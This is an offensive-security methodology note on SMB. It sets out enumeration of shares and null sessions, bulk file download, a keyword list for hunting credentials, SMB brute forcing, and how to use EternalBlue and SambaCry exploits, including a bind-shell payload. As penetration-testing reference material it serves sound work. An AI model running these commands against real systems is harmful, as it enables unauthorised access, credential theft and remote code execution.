# SMB - Methodology

### Overview

In a Windows environment, the Server Message Block (SMB) protocol is used to
share folders and files between computers. Sensible information can be stored
in shares accessible to unauthenticated users (NULL or GUEST session).

The SMB protocol has also been vulnerable to critical vulnerabilities, such as
MS17-010, allowing for privileged system command execution.

### Network scan

`nmap` and `nbtscan` can be used to scan the network for SMB services and
exposed shares:

```
nmap -v -p 445 -sV -sC -oA nmap_smb <RANGE | CIDR>
nbtscan -r <RANGE>
```

### Recon

The `nmap` `smb-os-discovery.nse` script attempts to determine the operating
system, computer name, domain, workgroup, and current time over the SMB
protocol.

```
nmap --script smb-os-discovery.nse -p 445 <HOST>
nmap -sU -sS --script smb-os-discovery.nse -p U:137,T:139 <HOST>
```

###### Null session and guest access

A null session refers to an unauthenticated NetBIOS session and allows
unauthenticated access to the shared files as well as a large amounts of
information about the machine, such as password policies, usernames, group
names, machine names, user and host SIDs.  
This Microsoft feature existed in SMB1 by default and was later restricted in
subsequent versions of SMB.

To detect and retrieve information about the machine through a null session,
the `enum4linux` Perl / `enum4linux-ng.py` Python scripts as well as the
`smbmap` can be used.

`enum4linux` being outdated, `enum4linux-ng.py` is recommended as the go to
tool. In addition to enumerating the exposed shares, it will also perform
`MSRPC` calls (using mainly `nmblookup`, `net`, `rpcclient` and `smbclientto`)
to enumerate users, groups, password policy information, etc.
For more information, refer to the `[L7] MSRPC` note.

Note that if the null session test if being performed from a domain-joined
system, the current user and computer account can be implicitly used for the
connection if a null authentication is not explicitly specified.

```
smbmap -H <HOSTNAME | IP>
smbmap -u "Guest" -H <HOSTNAME | IP>
smbmap -u "Invité" -H <HOSTNAME | IP>

enum4linux-ng.py -A -R <HOSTNAME | IP>
enum4linux <HOSTNAME | IP>

crackmapexec smb <HOSTNAME | IP> -u "" -p "" [--shares | -M spider_plus]
```

Standalone binaries of `smbmap`, `enum4linux-ng`, and `CrackMapExec` for Linux
(Windows for `CrackMapExec`) are available on the following
[`OffensivePythonPipeline` GitHub
repository](https://github.com/Qazeer/OffensivePythonPipeline).

The following quick bash script can be used to combine a network scan and null
session enumeration:

```
nbtscan -s ' ' <RANGE> | cut -d ' ' -f 1 | while read -r line ; do
  smbmap -H $line > smbmap_$line.txt
done
```

###### Authenticated recon

`enum4linux-ng.py` additionally supports authenticated queries:

```
enum4linux-ng.py -u "<USERNAME>" -pw "<PASSWORD>" -A -R <HOSTNAME | IP>
```

### List accessible shares

Multiples tools can, and should, be used to list the shares available on the
targeted server. Different tools may held different results depending of the
system targeted.

If no credentials are provided, a null session will be attempted.

Note that the following tools may be able to retrieve different results. It is
not unusual to be able to list the shares using one tool while the others could
not retrieve the same information.

```
# If no username provided, null session assumed.
smbmap [-d <WORKGROUP | DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] (-H <HOSTNAME | IP> | --host-file <FILE>)
interlace -c "smbmap [-d <WORKGROUP | DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | HASH>] -H _target_ 2>&1 > smbmap_output__cleantarget_.txt" [-t <CIDR_RANGE> | -tL <CIDR_RANGES_FILE>]

# nmap smb-enum-shares script will attempt to retrieve the file system path of the share.
nmap -v -sT -p 139,445 --script smb-enum-shares.nse <HOSTNAME | IP>
nmap -v -sU -sT -p U:137,T:139,445 --script smb-enum-shares.nse <HOSTNAME | IP>
nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>
nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>

crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> [--shares | -M spider_plus]
crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -H <HASH> [--shares | -M spider_plus]

msf > use auxiliary/scanner/smb/smb_enumshares

smbclient -U "" -N -L \\<HOSTNAME | IP>
# Some Windows servers do not support IP only and require the NetBIOS name to be specified.
smbclient -U "" -N -L \\<HOSTNAME> -I <IP>
# To authenticate as the specifed user. --pw-nt-hash to specify an NT hash instead of a cleartext password.
smbclient -U '<WORKGROUP | DOMAIN>\<USERNAME>' [--pw-nt-hash] -L \\<HOSTNAME | IP>

# Using the  Windows built-in net utility.
net view \\<HOSTNAME | IP> /all
```

The `SoftPerfect`'s' `NetScan` Windows graphical network scanner utility can be
used to conduct IPv4 and IPv6 hosts discovery and network shares enumeration.
`NetScan` integrates with the Windows built-in network share explorer and drive
mapping functionalities. For more information, refer to the
`General - Ports scan` note.

###### Retrieve shared files or directories ACL

The Windows `icals` and the Linux `smbcacls` utilities as well as the
PowerShell cmdlet `Get-Acl` can be used to retrieve the detailed ACL of
shared files and directories.

Note that `smbcacls` follows the same options input as `smbclient`.

Unitary file / directory ACL retrieval:

```
smbcacls -N "\\\\<HOSTNAME | IP>\\<SHARE>" <FILE | DIRECTORY>
smbcacls -U <USERNAME> [--pw-nt-hash] "\\\\<HOSTNAME | IP>\\<SHARE>" <FILE | DIRECTORY>

# runas /user:Guest /Netonly powershell.exe
icacls "\\<HOSTNAME | IP>\<SHARE>\<FILE | DIRECTORY>"
```

The following one-liner can be used on a Linux system to retrieve the ACL of a
mounted share:

```
# Files and directories in the specified share, with an eventual specified directory.
# If no directory is specified, the share UNC path shouldn't end with a backslash (example of a valid path: '\\<HOSTNAME>\<SHARE>').

for i in $(/bin/ls /mnt/<LOCAL_MOUNT_POINT>[/<DIRECTORY>]); do echo "\n$i"; smbcacls -N '\\<HOSTNAME>\<SHARE>[\<DIRECTORY>]' $i 2>/dev/null; done

# Recursively retrieve the ACL of all files and directories in the specified share or directory
cd /mnt/<LOCAL_MOUNT_POINT>/[<DIRECTORY>]
for i in $(/usr/bin/find *); do echo "\n$i"; smbcacls -N '\\<HOSTNAME>\<SHARE>[\<DIRECTORY>]' $i; done
```

The following PowerShell one-liner can be used to recursively retrieve the ACL
of all files and directories in a share:

```
Get-ChildItem "\\"\\<HOSTNAME | IP>\<SHARE>" -Recurse | Get-ACL | Select-Object Path, Owner, AccessToString, Group | Format-List
```

### List, search and download files

Similarly as for shares listing, multiples tools can be used to access an
exposed share.

`smbmap` provides files searching capabilities and automatic download of files
matching the search criteria.

If no credentials are provided, a null session will be attempted.

```
smbmap [-d <WORKGROUP | DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | NTLM_HASH>] -R <SHARE> (-H <HOSTNAME | IP> | --host-file <INPUT_FILE>)
smbmap [-d <WORKGROUP | DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | NTLM_HASH>] -F <PATTERN> (-H <HOSTNAME | IP> | --host-file <INPUT_FILE>)

nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args maxdepth=-1
nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-ls --script-args share=<SHARE>,maxdepth=-1
nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbpassword=<PASSWORD>,maxdepth=-1
nmap -v -sT -p 139,445 <HOSTNAME | IP> --script smb-enum-shares,smb-ls --script-args smbdomain=<DOMAIN/WORKGROUP>,smbusername=<USERNAME>,smbhash=<HASH>,maxdepth=-1

crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -shares <SHARE> --spider
crackmapexec <HOSTNAME | IP> -d <DOMAIN> -u <USERNAME> -H <HASH> -shares <SHARE> --spider

msf > use auxiliary/scanner/smb/smb_enumshares
set ShowFiles true
set SpiderShares true
```

`smbmap`, `metasploit` and `smbget` can be used to download, upload or delete
a specific file:

```
smbmap [-d <WORKGROUP | DOMAIN>] [-u <USERNAME>] [-p <PASSWORD | NTLM_HASH>] --download/--upload/--delete <PATH> (-H HOSTNAME | IP | --host-file <INPUT_FILE>)

msf > use auxiliary/admin/smb/download_file

smbget -a -R smb://<HOSTNAME | IP>/<SHARE>
smbget -w <WORKGROUP | DOMAIN> -U <USERNAME> -R smb://<HOSTNAME | IP>/<SHARE>
```

###### Interactive smbclient

The Linux `smbclient` CLI tool can be used to interact with the a `SMB` or
`SAMBA` share:

```
# NULL bind
smbclient -U "" -N "\\\\<HOSTNAME | IP>\\<SHARE>"

# To authenticate as USERNAME
smbclient [-W <WORKGROUP | DOMAIN>] -U "" "\\\\<HOSTNAME | IP>\\<SHARE>"

# --pw-nt-hash: specify an NT hash instead of a cleartext password.
smbclient -U '<WORKGROUP | DOMAIN>\<USERNAME>' [--pw-nt-hash] "\\\\<HOSTNAME | IP>\\<SHARE>"
```

The following basic commands can be used through the client (partial list):

```
# Display the file to stdout
get <REMOTE_FILE> -

# Download a file from the remote system
get	<REMOTE_FILE> [<LOCAL_FILE>]

# Upload a file to the remote system
put	<LOCAL_FILE> [<REMOTE_FILE>]

# Change directory
# Remote system directory
cd <DIRECTORY>
# Local system directory
lcd <DIRECTORY>

# Directory listing
# Remote system directory
ls <DIRECTORY>
# Local system directory
!ls <DIRECTORY>

# Show all available info on a file (create time, change time, etc.)
allinfo <FILE>
```

###### Recursive download of shared files

The `smbget` and `smbclient` utilities on Linux and the `PowerShell`
`Copy-Item` cmdlet on Windows can be used to recursively upload or download a
network share directories and files.

```
# Linux
# Supports recursive download
smbget --guest -n -R smb://<IP | HOSTNAME>/<SHARE>
smbget [-w <DOMAIN>] -U <USERNAME[%<PASSWORD>]> smb://<IP | HOSTNAME>/<SHARE>

# smbclient session - supports both recursive download and upload
mask ""
recurse ON
prompt OFF
cd '<PATH_REMOTE_DIR>'
lcd '<PATH_LOCAL_DIR>'
mput / mget *

# Windows
# Supports recursive download
Copy-Item -Recurse -Force -Verbose -Path '\\<IP | HOSTNAME>\<SHARE>\' -Destination <OUTPUT_DIR>
```

###### Mount shares

The share may also be mounted using the Linux `mount` utility tool (replacement
of smbmount):

```
# ro for read only and rw for read & write
# guest / no username for null session or specify an user with username=
# vers=1.0 if any error arise

mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,guest,vers=1.0
mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,username=<USER>,password=<PASSWORD>,vers=1.0

# In case of error: "mount error(112): Host is down", SMBv2 must be used
mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,user=Guest,vers=2.0
mount -t cifs //<HOSTNAME | IP>//<SHARE> /mnt/<FOLDER> -o rw,user=<USER>,password=<PASSWORD>,vers=2.0
```

From a Windows system, the `net` bultin can be used:

```
# NULL session share mapping.
net use <DRIVELETTER>: \\<HOSTNAME | IP>\<SHARE> "" /user:""

# Authenticated share mapping.
net use <DRIVELETTER>: \\<HOSTNAME | IP>\<SHARE> /user:"<WORKGROUP | DOMAIN>\<USERNAME>"
```

###### Distributed shares searching

*Agent Ransack*

The `Agent Ransack` GUI file searching tool can be used to conduct `grep` like
searches using the current Windows user identity and access rights.

Both file names or content can be searched, and one or multiple local or remote
locations may be specified.

The tool supports regex use, such as follow:

```
<KEYWORD1> OR <KEYWORD2>
<KEYWORD1> AND <KEYWORD2>

# Keywords search example.
pass OR secret pwd OR SecureString OR NetworkCredential OR credential OR Authorization: Basic OR key OR root:$ OR <DOMAIN_NAME>
```

### Authentication brute force

The `patator` tool can be used to brute force credentials on the service:

```
patator smb_login host=<HOSTNAME | IP> user=FILE0 password=FILE1 0=<WORDLIST_USER> 1=<WORDLIST_PASSWORD> -x ignore:fgrep='NT_STATUS_LOGON_FAILURE'
```

### Known vulnerabilities / CVE

Multiple known vulnerabilities affect the `SMB` protocol, that could allow if
unpatched unauthenticated Remote Code Execution.

###### Detection

`nmap` can be used to check for the following exploits:

```
smb-vuln-ms08-067
smb-vuln-ms10-054
smb-vuln-ms10-061
smb-vuln-ms17-010 / cve-2017-7494
smb-vuln-regsvc-dos

nmap -v -p 139,445 --script=vuln <HOSTNAME | IP | CIDR>
```

###### Symlink Directory Traversal

Prerequisites:
  - Samba before 3.3.11, 3.4.x before 3.4.6, and 3.5.x before 3.5.0rc3
  - A writable share

Use the `metasploit` module `auxiliary/admin/smb/samba_symlink_traversal` to
exploit a directory traversal flaw and create a directory that will link to
the root filesystem.

https://www.exploit-db.com/exploits/33599/

###### EternalBlue & SambaCry detection and exploitation

A remote code execution vulnerability exists in the way that the Microsoft
Server Message Block 1.0 (SMBv1) server handles certain requests. Write access
to the exposed share is required. Successful exploitation result in a SYSTEM
shell from an authenticated access.

*Detect vulnerability*

The `nmap` `smb-vuln-ms17-010.nse` and `smb-vuln-cve-2017-7494` scripts attempt
to detect if a SMBv1 server is vulnerable to the remote code execution
vulnerability MS17-010, a.k.a. EternalBlue (vulnerability exploited by WannaCry
and Petya ransomware) or CVE-2017-7494 aka SambaCry.

The Metasploit `auxiliary/scanner/smb/smb_ms17_010` module can be used as well
(supports host(s), range CIDR identifier, or hosts file).

```
msf> use auxiliary/scanner/smb/smb_ms17_010
# set RHOSTS file:<PATH>
# set THREADS <THREADS_NUMBER>

# EternalBlue
nmap --script smb-vuln-ms17-010.nse -p 445 <HOSTNAME | IP | CIDR>

# SambaCry
nmap --script smb-vuln-cve-2017-7494 -p 445 <HOSTNAME | IP | CIDR>
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p 445 <HOSTNAME | IP | CIDR>
```

If no share is available to unauthenticated users, the server may still be
vulnerable for authenticated users, meaning finding credentials would lead to
RCE.
The following versions are vulnerable:

```
# EternalBlue
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010

# SambaCry
Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4
```

*EternalBlue*

The following exploit may be used to achieve RCE through the EternalBlue
vulnerability on Windows hosts:

```
# Windows 7 and Server 2008 R2 (x64) All Service Packs
msf> use exploit/windows/smb/ms17_010_eternalblue

# Windows NT 5.0 / 5.1 / 5.2 (Windows 2000 / Windows XP & Windows Server 2003)
# https://github.com/helviojunior/MS17-010
python send_and_execute.py <HOSTNAME | IP> <BINARY>
```

*SambaCry*

The following exploit may be used to achieve RCE through the SambaCry
vulnerability on Linux hosts:

```
# Source
https://github.com/opsxcq/exploit-CVE-2017-7494

# Usage
exploit.py [-h] -t <HOSTNAME | IP> -e <EXECUTABLE> -s <REMOTESHARE> -r <REMOTEPATH> [-u <USER>] [-p <PASSWORD>] [-P <REMOTESHELLPORT>]

# The libbindshell-samba.so of the repository can be used to get a bind shell on the server :
# -e libbindshell-samba.so -r <SHARE>/libbindshell-samba.so
```

--------------------------------------------------------------------------------

### References

https://www.petri.com/how-to-get-ntfs-file-permissions-using-powershell
